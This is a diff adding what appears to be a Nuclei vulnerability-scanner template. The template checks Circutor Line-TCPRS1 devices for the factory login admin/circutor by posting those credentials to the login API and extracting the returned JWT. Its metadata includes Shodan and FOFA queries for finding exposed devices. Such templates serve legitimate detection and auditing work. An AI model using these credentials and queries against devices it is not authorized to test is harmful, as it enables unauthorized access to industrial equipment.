@@ -1,0 +1,58 @@
+http:
+- attack: pitchfork
+  extractors:
+  - group: 1
+    name: token
+    part: body
+    regex:
+    - '"Token"\s*:\s*"(eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,})"'
+    type: regex
+  matchers:
+  - part: body
+    regex:
+    - '"Token"\s*:\s*"eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}"'
+    type: regex
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - circutor
+    username:
+    - admin
+  raw:
+  - 'POST /api/v1/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json;charset=UTF-8
+
+
+    {"Username":"{{username}}","Password":"{{password}}"}
+
+    '
+id: circutor-default-login
+info:
+  author: s4e-io
+  description: 'A default login was discovered on a Circutor Line-TCPRS1 device. An
+    attacker can obtain access to user accounts, access sensitive information, modify
+    data, and execute unauthorized operations.
+
+    '
+  metadata:
+    fofa-query: body="Line-TCPRS1"
+    max-request: 1
+    product: line-tcprs1
+    shodan-query: http.html:"Line-TCPRS1"
+    vendor: circutor
+    verified: true
+  name: Circutor Line-TCPRS1 - Default Login
+  reference:
+  - https://circutor.com/en/products/line-tcprs1/
+  severity: high
+  tags: circutor,iot,tcprs1,default-login,vuln
